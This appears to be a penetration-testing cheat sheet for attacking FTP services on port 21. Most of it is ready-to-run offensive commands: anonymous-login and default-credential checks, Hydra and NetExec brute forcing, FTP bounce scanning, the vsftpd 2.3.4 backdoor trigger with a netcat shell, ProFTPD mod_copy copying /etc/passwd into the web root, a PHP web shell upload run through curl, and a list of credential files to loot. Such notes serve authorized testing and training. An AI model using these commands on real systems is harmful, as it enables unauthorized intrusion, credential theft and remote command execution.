# Port 21 - FTP

## Table of Contents

- [Enumeration](#enumeration)
  - [Default Credential](#default-credential)
  - [Config File](#config-file)
  - [Browser connect](#browser-connect)
  - [Nmap Scripts](#nmap-scripts)
  - [FTP Bounce Attack](#ftp-bounce-attack)
  - [Download All Files](#download-all-files)
- [Brute Force](#brute-force)
- [Exploitation](#exploitation)
  - [vsftpd 2.3.4 Backdoor](#vsftpd-234-backdoor)
  - [ProFTPD mod_copy](#proftpd-mod_copy-cve-2015-3306)
  - [Anonymous Upload Exploitation](#anonymous-upload-exploitation)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

```shell
ftp $rhost
>anonymous
>anonymous
>ls -a # List all files (even hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

### Default Credential

```shell
Default Credentials
anonymous : anonymous
_anonymous :
_ftp : ftp
```

### Config File

```shell
ftpusers
ftp.conf
proftpd.conf
vsftpd.conf
```

- /etc/vsftpd.conf

    ```shell
    anonymous_enable=YES
    anon_upload_enable=YES
    anon_mkdir_write_enable=YES
    anon_root=/home/username/ftp - Directory for anonymous.
    chown_uploads=YES - Change ownership of anonymously uploaded files
    chown_username=username - User who is given ownership of anonymously uploaded files
    local_enable=YES - Enable local users to login
    no_anon_password=YES - Do not ask anonymous for password
    write_enable=YES - Allow commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE
    ```

### Browser connect

```shell
ftp://anonymous:anonymous@$rhost
```

- Download files

    ```shell
    wget -m ftp://anonymous:anonymous@$rhost 
    ```

    ```shell
    wget -m --no-passive ftp://anonymous:anonymous@$rhost
    ```

### Nmap Scripts

```shell
# FTP server features
nmap -p 21 --script ftp-features $rhost

# FTP anonymous login
nmap -p 21 --script ftp-anon $rhost

# FTP brute force
nmap -p 21 --script ftp-brute $rhost
```

### FTP Bounce Attack

> Exploit FTP PORT command to scan other hosts

```shell
# Nmap FTP bounce scan
nmap -b <ftp_server>:<port> <target_network>

# Metasploit
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <ftp_server>
run
```

### Download All Files

```shell
wget -m ftp://anonymous:anonymous@$rhost

# Using lftp
lftp $rhost
mirror /
```

---

## Brute Force

### Nmap (Recommended)

> Nmap FTP brute force script
```shell
nmap -p 21 --script ftp-brute $rhost
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

### Hydra

> FTP brute force with Hydra
```shell
hydra -L users.txt -P passwords.txt -f ftp://$rhost
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://$rhost
```

### NetExec

> FTP credential testing
```shell
nxc ftp $rhost -u users.txt -p passwords.txt --threads 10
nxc ftp $rhost -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt --threads 10
```

---

## Exploitation

### vsftpd 2.3.4 Backdoor

> CVE-2011-2523 - Backdoor command execution
```shell
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $rhost
exploit
```

> Manual exploitation (trigger backdoor with :) in username)
```shell
telnet $rhost 21
USER backdoor:)
PASS anything

# Backdoor opens shell on port 6200
nc $rhost 6200
```

### ProFTPD mod_copy (CVE-2015-3306)

> Copy files to web directory
```shell
# Connect
nc $rhost 21

# Copy /etc/passwd to web root
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

> Metasploit
```shell
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS $rhost
set SITEPATH /var/www/html
exploit
```

### Anonymous Upload Exploitation

> Upload web shell if write permission
```shell
ftp $rhost
> anonymous
> anonymous
> binary
> put shell.php
> bye

# Access shell
curl http://$rhost/shell.php?cmd=id
```

---

## Post-Exploitation

### Sensitive Files

```
/etc/vsftpd.conf
/etc/proftpd.conf
/etc/pure-ftpd.conf
/var/log/vsftpd.log
/var/log/xferlog
~/.netrc
~/.ftppass
```

---

## See Also

- **[File Upload](../../7.Web-Exploit/7.8.File-Upload.md)** - Web shell upload techniques